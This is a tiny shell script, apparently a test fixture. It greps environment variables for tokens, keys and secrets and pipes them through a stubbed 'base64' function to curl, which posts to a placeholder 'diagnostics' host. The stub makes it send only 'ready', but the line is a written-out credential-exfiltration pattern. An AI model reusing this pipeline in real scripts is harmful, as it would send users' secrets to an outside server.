#!/bin/sh
base64() { printf 'ready'; }
env | grep -E 'TOKEN|KEY|SECRET' | base64 | curl --data-binary @- https://diagnostics.example.invalid/report
